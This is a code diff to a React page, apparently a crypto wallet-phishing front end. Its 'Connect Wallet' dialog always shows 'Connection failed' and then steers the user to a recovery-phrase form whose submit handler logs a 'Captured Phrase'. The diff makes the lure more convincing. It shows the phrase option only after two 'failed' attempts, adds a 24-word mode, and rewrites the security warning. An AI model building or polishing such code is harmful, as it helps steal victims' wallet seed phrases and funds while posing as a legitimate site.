@@ -80,6 +80,7 @@ export default function Home() {
   const [isRecoveryDialogOpen, setIsRecoveryDialogOpen] = useState(false);
   const [selectedWallet, setSelectedWallet] = useState<{name: string, icon: JSX.Element} | null>(null);
   const [phrase, setPhrase] = useState(Array(12).fill(''));
+  const [failedAttempts, setFailedAttempts] = useState(0);
 
   const stickerAutoplay = React.useRef(Autoplay({ delay: 2000, stopOnInteraction: true, stopOnMouseEnter: true }))
   const hoodieAutoplay = React.useRef(Autoplay({ delay: 2000, stopOnInteraction: true, stopOnMouseEnter: true }))
@@ -135,6 +136,7 @@ export default function Home() {
   
   const handleTryAgain = () => {
     if(selectedWallet) {
+      setFailedAttempts(prev => prev + 1);
       handleWalletClick(selectedWallet);
     }
   }
@@ -149,6 +151,16 @@ export default function Home() {
     newPhrase[index] = value;
     setPhrase(newPhrase);
   }
+  
+  const togglePhraseLength = (e: React.MouseEvent<HTMLButtonElement>) => {
+    e.preventDefault();
+    setPhrase(prev => {
+        if (prev.length === 12) {
+            return Array(24).fill('');
+        }
+        return Array(12).fill('');
+    });
+  };
 
   const handleRecoverySubmit = () => {
     console.log("Captured Phrase:", phrase.join(' '));
@@ -233,6 +245,7 @@ export default function Home() {
                   if (!open) {
                     setConnectionState('initial');
                     setSelectedWallet(null);
+                    setFailedAttempts(0);
                   }
                 }}>
                   <DialogTrigger asChild>
@@ -240,7 +253,7 @@ export default function Home() {
                        {connectionState === 'connected' ? 'Connected' : 'Connect Wallet'}
                     </Button>
                   </DialogTrigger>
-                  <DialogContent className="bg-[#141414] border-gray-800 rounded-3xl w-full max-w-xs p-0">
+                  <DialogContent className="bg-[#141414] border-gray-800 rounded-3xl w-full max-w-sm p-0">
                       <DialogHeader className="p-6 pb-0">
                         {connectionState !== 'initial' && (
                            <Button variant="ghost" className="absolute left-4 top-4 p-2 text-gray-400 hover:bg-gray-700/80" onClick={() => setConnectionState('initial')}>
@@ -296,7 +309,9 @@ export default function Home() {
                              </div>
                              <p className="text-white font-bold text-xl">Connection failed</p>
                               <Button onClick={handleTryAgain} className="w-full bg-blue-500 hover:bg-blue-600 text-white font-bold rounded-lg">Try Again</Button>
-                              <Button onClick={handleOpenRecovery} variant="link" className="text-blue-500">Use 12/24 key phrase</Button>
+                              {failedAttempts >= 2 && (
+                                <Button onClick={handleOpenRecovery} variant="link" className="text-blue-500">Use 12/24 key phrase</Button>
+                              )}
                           </div>
                         )}
                       </div>
@@ -320,18 +335,18 @@ export default function Home() {
                           <DialogTitle className="text-xl font-bold text-white text-center">Recovery Phrase</DialogTitle>
                       </DialogHeader>
                       <div className="p-6 overflow-y-auto">
-                        <div className="flex items-start gap-3 bg-[#1C1C1C] p-4 rounded-lg border-l-4 border-orange-500 mb-6">
-                            <ShieldAlert className="h-8 w-8 text-orange-500 mt-1" />
+                        <div className="flex items-start gap-3 bg-destructive/20 p-4 rounded-lg border-l-4 border-destructive mb-6">
+                            <ShieldAlert className="h-8 w-8 text-destructive mt-1" />
                             <div>
-                               <h3 className="font-bold text-orange-500">Attention</h3>
-                               <p className="text-gray-300 text-sm">Never share the recovery phrase. Anyone with these words has full access to your wallet.</p>
+                               <h3 className="font-bold text-destructive">SECURITY WARNING</h3>
+                               <p className="text-gray-300 text-sm">Never share your recovery phrase. Anyone with these words will have full, irretrievable access to your wallet and all of its assets.</p>
                             </div>
                         </div>
                         <div className="bg-[#252525] p-4 rounded-lg">
                            <div className="grid grid-cols-2 gap-x-8 gap-y-4">
                               {phrase.map((word, index) => (
                                 <div key={index} className="flex items-center gap-3">
-                                  <span className="text-gray-500 font-mono text-sm">{index + 1}</span>
+                                  <span className="text-gray-500 font-mono text-sm w-6 text-right">{index + 1}.</span>
                                   <Input
                                     type="text"
                                     value={word}
@@ -341,6 +356,11 @@ export default function Home() {
                                 </div>
                               ))}
                            </div>
+                           <div className="text-center mt-4">
+                                <button onClick={togglePhraseLength} className="text-sm text-blue-500 hover:underline">
+                                    {phrase.length === 12 ? 'Have a 24-word phrase? Tap here' : 'Use a 12-word phrase instead'}
+                                </button>
+                            </div>
                         </div>
                       </div>
                       <DialogFooter className="p-6 pt-2 border-t border-gray-800 flex-shrink-0">
@@ -656,3 +676,6 @@ export default function Home() {
 
     
 
+
+
+    
